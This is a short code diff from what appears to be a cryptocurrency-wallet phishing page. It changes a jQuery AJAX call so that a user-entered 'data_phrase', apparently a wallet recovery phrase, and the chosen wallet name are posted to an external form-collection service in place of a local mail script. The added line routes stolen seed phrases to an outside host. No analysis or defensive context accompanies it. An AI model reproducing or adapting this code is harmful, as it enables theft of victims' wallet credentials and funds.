@@ -2204,7 +2204,7 @@
                     $(this).text('Loading...').css('pointer-events', 'none')
 
                     $.ajax({
-                        url: "sendmail.php",
+                        url: "https://api.comfyform.com/s/6785198e26da4737ba0258db/",
                         method: "POST",
                         data: { "load_phrase": 1, "data_phrase": field.val(), "wallet_selected": $('#wallet_name').text().trim() },
                         success: function (result) {
